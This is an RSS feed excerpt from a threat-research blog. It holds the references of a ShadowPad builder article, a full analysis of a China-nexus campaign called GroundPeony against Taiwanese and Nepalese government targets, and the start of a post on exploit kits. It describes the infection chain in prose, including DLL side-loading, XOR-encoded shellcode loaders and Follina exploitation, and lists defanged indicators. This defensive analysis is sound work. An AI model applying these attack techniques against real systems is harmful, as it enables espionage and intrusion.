<p>In this article, we introduced the ShadowPad builder. ShadowPad, widely used by various targeted attack groups as a successor to PlugX, had limited information available about its builder until now. This article sheds light on how attackers build ShadowPad.</p>

<p>We also organized the relationships between attack groups using ShadowPad. Our research is still ongoing. We would love to engage in active discussions. If you have any opinions or comments, please contact us. We look forward to hearing from you.</p>

<h2 id="acknowledgments">Acknowledgments</h2>
<p>We received a lot of help from our friends in writing this article. While we won’t name individuals here, we are immensely grateful to the many supportive reviewers. We want to take this opportunity to express our deepest gratitude to you.</p>

<h2 id="references">References</h2>
<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p>TrendMicro, “Operation ENDTRADE: TICK’s Multi-Stage Backdoors for Attacking Industries and Stealing Classified Data”, https://documents.trendmicro.com/assets/pdf/Operation-ENDTRADE-TICK-s-Multi-Stage-Backdoors-for-Attacking-Industries-and-Stealing-Classified-Data.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:1">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p>マクニカ, “標的型攻撃の実態と対策アプローチ 第5版 日本を狙うサイバーエスピオナージの動向 2020年度”, https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:2">&#8617;</a> <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:2:1">&#8617;<sup>2</sup></a> <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:2:2">&#8617;<sup>3</sup></a></p>
    </li>
    <li id="fn:3">
      <p>nao_sec, “An Overhead View of the Royal Road”, https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:3">&#8617;</a></p>
    </li>
    <li id="fn:4">
      <p>nao_sec, “Royal Road! Re:Dive”, https://nao-sec.org/2021/01/royal-road-redive.html <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:4">&#8617;</a></p>
    </li>
    <li id="fn:5">
      <p>SentinelOne, “ShadowPad A Masterpiece of Privately Sold Malware in Chinese Espionage”, https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:5">&#8617;</a> <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:5:1">&#8617;<sup>2</sup></a> <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:5:2">&#8617;<sup>3</sup></a></p>
    </li>
    <li id="fn:6">
      <p>FBI, “APT Actors Exploiting Newly-Identified Zero Day in ManageEngine Desktop Central”, https://www.ic3.gov/Media/News/2021/211220.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:6">&#8617;</a> <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:6:1">&#8617;<sup>2</sup></a></p>
    </li>
    <li id="fn:7">
      <p>HarfangLab, “A comprehensive analysis of I-Soon’s commercial offering”, https://harfanglab.io/en/insidethelab/isoon-leak-analysis/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:7">&#8617;</a></p>
    </li>
    <li id="fn:8">
      <p>Kaspersky, “ShadowPad in corporate networks”, https://securelist.com/shadowpad-in-corporate-networks/81432/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:8">&#8617;</a></p>
    </li>
    <li id="fn:9">
      <p>Kaspersky, “Operation ShadowHammer”, https://securelist.com/operation-shadowhammer/89992/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:9">&#8617;</a></p>
    </li>
    <li id="fn:10">
      <p>ESET, “Connecting the dots: Exposing the arsenal and methods of the Winnti Group”, https://www.welivesecurity.com/2019/10/14/connecting-dots-exposing-arsenal-methods-winnti/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:10">&#8617;</a></p>
    </li>
    <li id="fn:11">
      <p>ESET, “Winnti Group targeting universities in Hong Kong”, https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:11">&#8617;</a></p>
    </li>
    <li id="fn:12">
      <p>マクニカ, “標的型攻撃の実態と対策アプローチ 第4版 日本を狙うサイバーエスピオナージの動向 2019年度下期”, https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2019_4.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:12">&#8617;</a></p>
    </li>
    <li id="fn:13">
      <p>PwC, “Around the world in 80 days 4.2bn packets”, https://www.youtube.com/watch?v=YCwyc6SctYs <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:13">&#8617;</a></p>
    </li>
    <li id="fn:14">
      <p>CrowdStrike, “Manufacturing Industry in the Adversaries’ Crosshairs”, https://www.crowdstrike.com/blog/adversaries-targeting-the-manufacturing-industry/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:14">&#8617;</a></p>
    </li>
    <li id="fn:15">
      <p>Kaspersky, “APT trends report Q2 2020”, https://securelist.com/apt-trends-report-q2-2020/97937/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:15">&#8617;</a></p>
    </li>
    <li id="fn:16">
      <p>Positive Technologies, “ShadowPad: new activity from the Winnti group”, https://www.ptsecurity.com/upload/corporate/ww-en/pt-esc/winnti-2020-eng.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:16">&#8617;</a></p>
    </li>
    <li id="fn:17">
      <p>Symantec, “APT41: Indictments Put Chinese Espionage Group in the Spotlight”, https://symantec-enterprise-blogs.security.com/threat-intelligence/apt41-indictments-china-espionage <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:17">&#8617;</a></p>
    </li>
    <li id="fn:18">
      <p>Dr.Web, “Study of the ShadowPad APT backdoor and its relation to PlugX”, https://st.drweb.com/static/new-www/news/2020/october/Study_of_the_ShadowPad_APT_backdoor_and_its_relation_to_PlugX_en.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:18">&#8617;</a></p>
    </li>
    <li id="fn:19">
      <p>TrendMicro, “Earth Akhlut: Exploring the Tools, Tactics, and Procedures of an Advanced Threat Actor Operating a Large Infrastructure”, https://vblocalhost.com/uploads/VB2020-Lunghi-Horejsi.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:19">&#8617;</a></p>
    </li>
    <li id="fn:20">
      <p>ESET, “Operation StealthyTrident: corporate software under attack”, https://www.welivesecurity.com/2020/12/10/luckymouse-ta428-compromise-able-desktop/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:20">&#8617;</a></p>
    </li>
    <li id="fn:21">
      <p>Positive Technologies, “Higaisa or Winnti? APT41 backdoors, old and new”, https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:21">&#8617;</a></p>
    </li>
    <li id="fn:22">
      <p>Recorded Future, “China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions”, https://go.recordedfuture.com/hubfs/reports/cta-2021-0228.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:22">&#8617;</a></p>
    </li>
    <li id="fn:23">
      <p>Recorded Future, “Chinese State-Sponsored Activity Group TAG-22 Targets Nepal, the Philippines, and Taiwan Using Winnti and Other Tooling”, https://www.recordedfuture.com/blog/chinese-group-tag-22-targets-nepal-philippines-taiwan <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:23">&#8617;</a></p>
    </li>
    <li id="fn:24">
      <p>TrendMicro, “Delving Deep: An Analysis of Earth Lusca’s Operations”, https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:24">&#8617;</a></p>
    </li>
    <li id="fn:25">
      <p>Secureworks, “ShadowPad Malware Analysis”, https://www.secureworks.com/research/shadowpad-malware-analysis <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:25">&#8617;</a></p>
    </li>
    <li id="fn:26">
      <p>Recorded Future, “Continued Targeting of Indian Power Grid Assets by Chinese State-Sponsored Activity Group”, https://go.recordedfuture.com/hubfs/reports/ta-2022-0406.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:26">&#8617;</a></p>
    </li>
    <li id="fn:27">
      <p>SentinelOne, “Moshen Dragon’s Triad-and-Error Approach Abusing Security Software to Sideload PlugX and ShadowPad”, https://www.sentinelone.com/labs/moshen-dragons-triad-and-error-approach-abusing-security-software-to-sideload-plugx-and-shadowpad/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:27">&#8617;</a></p>
    </li>
    <li id="fn:28">
      <p>TeamT5, “The Next Gen PlugX - ShadowPad - A Dive into the Emerging China-Nexus Modular Trojan, Pangolin8RAT”, https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-LeonSilvia-NextGenPlugXShadowPad.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:28">&#8617;</a></p>
    </li>
    <li id="fn:29">
      <p>Positive Technologies, “Space Pirates: analyzing the tools and connections of a new hacker group”, https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/space-pirates-tools-and-connections/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:29">&#8617;</a></p>
    </li>
    <li id="fn:30">
      <p>Kaspersky, “Attacks on industrial control systems using ShadowPad”, https://ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:30">&#8617;</a></p>
    </li>
    <li id="fn:31">
      <p>ESET, “Worok: The big picture”, https://www.welivesecurity.com/2022/09/06/worok-big-picture/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:31">&#8617;</a></p>
    </li>
    <li id="fn:32">
      <p>Elastic, “Update to the REF2924 intrusion set and related campaigns”, https://www.elastic.co/security-labs/update-to-the-REF2924-intrusion-set-and-related-campaigns <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:32">&#8617;</a></p>
    </li>
    <li id="fn:33">
      <p>Symantec, “Lancefly: Group Uses Custom Backdoor to Target Orgs in Government, Aviation, Other Sectors”, https://symantec-enterprise-blogs.security.com/threat-intelligence/lancefly-merdoor-zxshell-custom-backdoor <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:33">&#8617;</a></p>
    </li>
    <li id="fn:34">
      <p>TrendMicro, “Possible Supply-Chain Attack Targeting Pakistani Government Delivers Shadowpad”, https://www.trendmicro.com/en_us/research/23/g/supply-chain-attack-targeting-pakistani-government-delivers-shad.html <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:34">&#8617;</a></p>
    </li>
    <li id="fn:35">
      <p>Recorded Future, “RedHotel: A Prolific, Chinese State-Sponsored Group Operating at a Global Scale”, https://go.recordedfuture.com/hubfs/reports/cta-2023-0808.pdf <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:35">&#8617;</a></p>
    </li>
    <li id="fn:36">
      <p>Symantec, “Redfly: Espionage Actors Continue to Target Critical Infrastructure”, https://symantec-enterprise-blogs.security.com/threat-intelligence/critical-infrastructure-attacks <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:36">&#8617;</a></p>
    </li>
    <li id="fn:37">
      <p>Palo Alto Networks, “Cyberespionage Attacks Against Southeast Asian Government Linked to Stately Taurus, Aka Mustang Panda”, https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/ <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:37">&#8617;</a></p>
    </li>
    <li id="fn:38">
      <p>TrendMicro, “Earth Krahang Exploits Intergovernmental Trust to Launch Cross-Government Attacks”, https://www.trendmicro.com/en_us/research/24/c/earth-krahang.html <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:38">&#8617;</a></p>
    </li>
    <li id="fn:39">
      <p>United States Department of Justice, “Seven International Cyber Defendants, Including “Apt41” Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally”, https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer <a class="reversefootnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fnref:39">&#8617;</a></p>
    </li>
  </ol>
</div>
]]></content:encoded>
<pubDate>2024-06-30T15:00:00+00:00</pubDate>
</item>
<item>
<title>GroundPeony: Crawling with Malice</title>
<link>http://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html</link>
<guid>http://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html</guid>
<content:encoded><![CDATA[
<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/top.png" /></p>

<p>This blog post is based on “GroundPeony: Crawling with Malice” that we presented at HITCON CMT 2023. We are grateful to HITCON for giving us the opportunity to present.</p>

<p><a href="https://hitcon.org/2023/CMT/en/agenda/e8fe6942-9c60-419a-b9a0-dbda80a27ad0/">https://hitcon.org/2023/CMT/en/agenda/e8fe6942-9c60-419a-b9a0-dbda80a27ad0/</a></p>

<p>Presentation material (PDF) is <a href="https://github.com/nao-sec/materials/blob/master/HITCON2023/GroundPeony_Crawling_with_Malice.pdf">here</a>.</p>

<h2 id="abstract">Abstract</h2>
<p>In March 2023, we discovered a cyber attack campaign targeting Taiwanese government agencies. The campaign employed devious tactics such as tampering with legitimate websites to distribute malware, using URL obfuscation, and employing multi-stage loaders. In this post, we will first provide an overview of this attack campaign and share the analysis results of the malware used. Through this, the reader will be able to understand the latest attack cases targeting Taiwan.</p>

<p>As a result of our investigation, we suspect that this attack campaign was orchestrated by a China-nexus attack group. We will discuss the specific evidence supporting this assumption, and trace back to past attack campaigns. Past campaigns include attacks that exploted the CVE-2022-30190, known as Follina, at the zero-day stage. These studies enable to understand attacker’s motivations and attack backgrounds.</p>

<p>This post will enable SOC analysts, IR team members, CSIRT personnel, and others to gain a deep understanding of the latest APT attack trends targeting East and South Asia including Taiwan that have never been reported so far, and to take concrete countermeasures.</p>

<h2 id="groundpeony">GroundPeony</h2>
<p>The name “GroundPeony” was created by us and is not generally known. Based on our reading of the few public reports, we believe they are identical or close to the group dubbed UNC3347<sup id="fnref:1"><a class="footnote" href="http://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html#fn:1" rel="footnote">1</a></sup> by Mandiant. Active since at least 2021, it targets government organizations in East and South Asia, specifically Taiwan and Nepal.</p>

<p>There are two points to note about this group. First, GroudPeony exploits zero-day vulnerability. Specifically, it was the earliest exploiting CVE-2022-30190, also known as Follina. Follina itself is not very complex vulnerability, but it is speculated that this group could develop or have access to a zero-day. This is very interesting. Second, GroundPeony compromised websites for malware distribution. In the past case, Nepal’s government website was compromised.</p>

<p>For these reasons, GroundPeony is considered to be an APT group with high attack skill and attack motivation.</p>

<h2 id="timeline">Timeline</h2>
<p>This is a quick look at GroundPeony’s attack timeline.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/timeline.png" /></p>

<p>The malware has existed on VirusTotal since around 2021. The oldest attack campaign we know is from April to June 2022. Around this time, Follina was exploited to attack Nepal, India, and other countries.</p>

<p>After that, we forgot about them for a while, but they started attacking again around March 2023. At this time, they attacked Taiwan and Nepal. In this post, we will deal with the case of April 2022 and March 2023.</p>

<h2 id="latest-attack-flow">Latest Attack Flow</h2>
<p>Let’s look at a specific case. The first is the attack on the Taiwanese government that occurred in March 2023.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/flow.png" /></p>

<p>The attack started from spear-phishing email. The email has a DOC file attached. And, a URL is written in the DOC file, and the ZIP file is downloaded by the URL. The ZIP file contains EXE file and DLL file. And executing them, infects malware.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/mail.png" /></p>

<p>The spear-phishing email looked like this. It is about discussions on maritime issues between Taiwan and the USA. This time, I put a mosaic in the image, but the destination was the Taiwanese government organication. Also, the source is cable TV company in Taiwan. Attached to the email is a DOC file with the file name “Regarding bilateral consultations with the USA”.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/doc.png" /></p>

<p>When open the attached DOC file, it looks like this. It pretends to have an error instead of something like a file name. It says to apply an update to resolve the error. The URL is written for the download of the update. When try to download the update file from this URL, it actually downloads ZIP file containing malware.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/url.png" /></p>

<p>The URL used at this time is very strange. At first glance, it may look like a legitimate Microsoft website. But, due to the structure of the URL, the original host information is Cuttly.</p>

<p>When access this URL, you will access to Cuttly. And it will redirect to ZIP file. At this time, the URL redirected from Cuttly was the website of a Taiwanese educational institution. But, this website was compromised, and a ZIP file containing malware was placed.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/zip.png" /></p>

<p>The ZIP file contains 2 EXE files, one TXT file, and one directory named “$RECYCLE.BIN” that looks like Windows trash box. There are 4 files in the $RECYCLE.BIN directory, all with the DOCX extension. But these are not DOCX files. They are actually malware.</p>

<p>By the way, did you notice that the update number written in the DOC file and the ZIP file are different? We don’t know if this was simply a mistake by the attacker or a remnant of another ongoing attack campaign.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/kb.png" /></p>

<h2 id="malware-analysis">Malware Analysis</h2>
<p>Let’s take a look at how malware is executed. First, there are 2 files with the EXE extension included in the ZIP file, 系統安全補丁.exe and Install.exe. But the behavior is the same.</p>

<p>When the EXE file is executed, the 4 files placed in $RECYCLE.BIN will be copied to the mic directory under the ProgramData directory. At this time, the names of the 4 files are also changed.
The 4 files are renamed to mic.exe, version.dll, mic.doc and mic.ver. And then, mic.exe is executed.</p>

<p>mic.exe is a legitimate file with a digital signature. But, it loads version.dll which exists in the same directory. When version.dll is executed by DLL Side-Loading, it loads and decrypts mic.doc. The decryption result is malware we call “micDown”</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/micdown.png" /></p>

<ol>
  <li>mic.exe
    <ul>
      <li>Legitimate EXE file with a digital signature</li>
    </ul>
  </li>
  <li>version.dll
    <ul>
      <li>DLL for Side-Loading</li>
      <li>Shellcode launcher for mic.doc</li>
    </ul>
  </li>
  <li>mic.doc
    <ul>
      <li>Shellcode downloader (micDown)</li>
    </ul>
  </li>
  <li>mic.ver
    <ul>
      <li>Config file for micDown</li>
    </ul>
  </li>
</ol>

<p>Decoding of version.dll process is in two steps. First version.dll decodes mic.doc and executes it as shellcode. The shellcode further decodes itself and continues execution.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/versiondll.png" /></p>

<p>The export function of version.dll is very simple. First, it reads mic.doc into the memory area allocated by VirtualAlloc with read, write, and execute permissions. Then, it decodes that data with a custom XOR algorithm that combines sub, xor add instructions. When decoding is complete, the process moves to the memory area where the decoded shellcode is located.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/dll1.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/dll2.png" /></p>

<p>The decoded shellcode uses the same custom XOR algorithm as before. The RtlDecompressBuffer is then used to decompress. The shellcode is decoded from the beginning of the file, excluding jump instruction.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/doc1.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/doc2.png" /></p>

<p>The decoded code executes the executable with the MZ header removed. It also decodes the data in mic.ver and uses it as a configuration. Finally, it downloads and executes the shellcode from the C&amp;C server, saved in the config.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/payload1.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/payload2.png" /></p>

<p>The shellcode is encoded with an algorithm similar to that of a previous file. It differs slightly from the file encoding algorithm in that the order of the add,sub,xor instruction is swapped.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/payload3.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/payload4.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/payload5.png" /></p>

<p>The encoded config consists of a 0x40 byte C&amp;C host area and a 0x2 byte port area. The IP address at this time was 103[.]199.17.184.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/ver1.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/ver2.png" /></p>

<h2 id="related-file">Related File</h2>
<p>An attack similar to the Taiwanese attack we have previously described was also carried out in Nepal. Although the specific origin of the attack is unknown, a legitimate website was compromised and a ZIP file was installed, as was the case in Taiwan.</p>

<p>The legitimate website that was compromised was the Nepalese government’s COVID-19 vaccine-related website. For reference, China is known to have provided vaccines to Nepal as part of its One Belt, One Road partnership<sup id="fnref:2"><a class="footnote" href="http://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html#fn:2" rel="footnote">2</a></sup>. It is unclear what this has to do with the attacking campaing.</p>

<p>In the attack against Nepal, app.onedrivo[.] com was used as the C&amp;C server. The domain was taken using PublicDomainRegistry. More on this domain later.</p>

<p>In the attack against Nepal, the malware behaves the same way. When the EXE file is executed, it copies and renames the file and executes mic.exe. mic.exe sideloads version.dll. Then version.dll will read, decode and execute mic.doc. The malware executed was the same as the previous one, called micDown.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/flow2.png" /></p>

<h2 id="related-past-campaign">Related Past Campaign</h2>
<p>The C&amp;C server used in the previous attack on Nepal has been used in other attacks in the past. The attack on Nepal occurred in April 2022. At that time, this group exploited CVE-2022-30190, also known as Follina. Finally, the CobaltStrike beacon is executed. This domain was used as the server to download this CobaltStrike and as the C&amp;C server.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/past.png" /></p>

<p>The DOCX file that served as the decoy is a statement of accusation by a person claiming to be a student at Kathmandu University. We do not know the authenticity of this accusation.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/decoy.png" /></p>

<p>This DOCX file contains the external link settings. This will load the HTML file. The HTML file contains JavaScript code to change the location. The modified location is written with the scheme ms-msdt. This is the scheme for the Microsoft Support Diagnostic Tool. However,a bug existed in this that allowed PowerShell code to be executed. So, PowerShell code to be executed from a DOCX file.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/xml.png" /></p>

<p>The PowerShell code is downloaded, extracted and executed to a CAB file from the server.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/ps1.png" /></p>

<p>Inside the CAB file is an EXE file made by PyInstaller. This EXE is a downloader. And can be downloaded from onedrivo[.]com and run the CobaltStrike beacon.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/pyi.png" /></p>

<h2 id="attribution">Attribution</h2>
<p>Let us consider the attribution of this group. To begin with, it is important when this group was exploiting Follina. Follina was finally exploited by a very large number of APT groups. But that was after the details were made public. Here is the timeline.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/follina.png" /></p>

<p>The first time Follina became known to the public was through our tweets. We discovered the Follina sample against Belarus on May 27 and tweeted about it. Since then, detailed explanatory blogs have been published and PoCs have been released.</p>

<p>Going back earlier, a vulnerability was reported to Microsoft by the ShadowChasing group on April 12. However, Microsoft did not acknowledge it as a vulnerability at that time. The attack reported is also against Belarus.</p>

<p>Let’s go back further. In our research, we found samples from April 7 and 8. These are attacks against Nepal and India. We believe this is the earliest Follina sample. And these are the attacks by the group Mandiant calls UNC3347, which we call GroundPeony.</p>

<p>In other words, GroundPeony was exploiting Follina during a perfect zero-day period. Various organizations have written reports about Follina exploits, but China-nexus is the only group that has exploited Follina during zero-day periods. Therefore, we believe GroundPeony is the only China-nexus APT group with zero-day access.</p>

<p>Let’s look at another indicator. We analyzed an EXE file made by PyInstaller that is executed after the Follina exploit. The PyInstaller binary can easily decompile the Python code. The extracted file looked like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/python.png" /></p>

<p>A large amount of Chinese comments were written. Also, the code was copy-pasted from various public repositories, but most of it was written by Chinese developer. This is a very elementary mistake. However, it is highly likely that the person who created the malware is a native Chinese speaker.</p>

<p>We tried mapping the victim (or presumed to be). A very interesting diagram. What does this mean?</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/map.png" /></p>

<p>Based on our previous research, we have created a diamond model.</p>

<p><img alt="" src="https://nao-sec.org/assets/2023-08-22/diamond.png" /></p>

<p>GroundPeony, also known as UNC3347, is a China-nexus APT group. They have been active since at least 2021. They target East and South Asia like Taiwan and Nepal. In particular, they seem to be targeting government agencies, research institutions, and telecoms.</p>

<p>The attacks begin with spear phishing emails. They compromised legitimate websites and use them for their attacks. There was nothing unique about the IP addresses used, and no connection to the victim country could be found. GroundPeony also provides zero-day access. Besides popular tools such as CobaltStrike, they also use group’s original malware.</p>

<h2 id="wrap-up">Wrap-Up</h2>
<p>GroundPeony is an APT group of which little is known so far. It is believed to be China-nexus. It is targeting East and South Asian countries like Taiwan and Nepal. In particular, they seem to be targeting government agencies, research institutions, and telecoms.</p>

<p>One point worth noting is their use of zero-day. Follina was exploited in its early period. This group also compromised legitimate websites and install malware. GroundPeony is an aggressive APT group. Please keep an eye on their future developments.</p>

<h2 id="ioc">IoC</h2>
<ul>
  <li>103[.]199.17.184</li>
  <li>160[.]20.145.111</li>
  <li>172[.]93.189.239</li>
  <li>*.onedrivo[.]com</li>
  <li>1992b552bdaf93caeb470f94b4bf91e0157ba4a9bb92fb8430be946c0ddabdeb</li>
  <li>425630cc8be2a7dc2626ccd927bb45e5d40c1cb606bb5b2a7e8928df010af7c9</li>
  <li>fa6510a84929a0c49d91b3887189fca5a310129912d8e7d14fed062e9446af7e</li>
  <li>142a027d78c7ab5b425c2b849b347952196b03618e4ad74452dbe2ed4e3f73cd</li>
  <li>d1989ca12426ed368816ce00f08975dc1ff1e4f474592523c40f9af344a57b49</li>
  <li>6e13e5c7fcbafc47df259f2565efaed51bc1d021010c51673a7c455b5d4dad2b</li>
  <li>ef611e07e9d7e20ed3d215e4f407a7a7ca9f64308905c37e53df39f8a5bcbb3c</li>
  <li>7b814e43af86a84b9ad16d47f9c74da484ea69903ef0fbe40ec62ba123d83a9a</li>
  <li>f3e0a3dd3d97ccc23c4cee0fd9c247dbe79fbf39bc9ae9152d4676c96e46e483</li>
  <li>50182fca4c22c7dde7b8392ceb4c0fef67129f7dc386631e6db39dec73537705</li>
</ul>

<h2 id="references">References</h2>
<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p>Mandiant, “Move, Patch, Get Out the Way: 2022 Zero-Day Exploitation Continues at an Elevated Pace”, https://www.mandiant.com/resources/blog/zero-days-exploited-2022 <a class="reversefootnote" href="http://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html#fnref:1">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p>Ministry of Foreign Affairs of the People’s Republic of China, “Initiative for Belt and Road Partnership on COVID-19 Vaccines Cooperation”, https://www.fmprc.gov.cn/mfa_eng/wjdt_665385/2649_665393/202106/t20210624_9170568.html <a class="reversefootnote" href="http://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html#fnref:2">&#8617;</a></p>
    </li>
  </ol>
</div>
]]></content:encoded>
<pubDate>2023-08-22T03:00:00+00:00</pubDate>
</item>
<item>
<title>Exploit Kit still sharpens a sword</title>
<link>http://nao-sec.org/2021/04/exploit-kit-still-sharpens-a-sword.html</link>
<guid>http://nao-sec.org/2021/04/exploit-kit-still-sharpens-a-sword.html</guid>
<content:encoded><![CDATA[
<p>Note: This blog post doesn’t make sense to many</p>

<p>It’s 2021 now. Moreover, the quarter has already passed. I thought Drive-by Download attack was dead four years ago. Angler Exploit Kit has disappeared, pseudo-Darkleech and EITest campaign have disappeared, and RIG Exploit Kit has also declined. At that time, Drive-by Download attack was definitely supposed to die. However, even if in 2021, it will not disappear fire still slightly.</p>

<p>In April 2021, I received some incredible notices. For example, there are the following notifications.</p>

<ul>
  <li>PurpleFox Exploit Kit has started exploiting CVE-2021-26411</li>
  <li>RIG Exploit Kit has started exploiting CVE-2021-26411</li>
  <li>Bottle Exploit Kit is back, and has started exploiting CVE-2020-1380 and CVE-2021-26411</li>
  <li>Underminer Exploit Kit is back</li>
</ul>

<p>Repeat again. It’s 2021 now. Not 2017. Internet Explorer was taken away by Chrome and Edge, and Drive-by Download attack was supposed to die. Why are there still Drive-by Download attacks? Here are some reasons, including the opinions of your friends.</p>

<ol>
  <li>Internet Explorer is still used in some countries/regions including Japan</li>
  <li>Due to the influence of corona, remote work has increased, and the number of users with network security vulnerabilities has increased</li>
  <li>Internet Explorer vulnerabilities still discovered and exploit code published</li>
</ol>

<p>In reality, these are intricately intertwined, and there may be different reasons.</p>

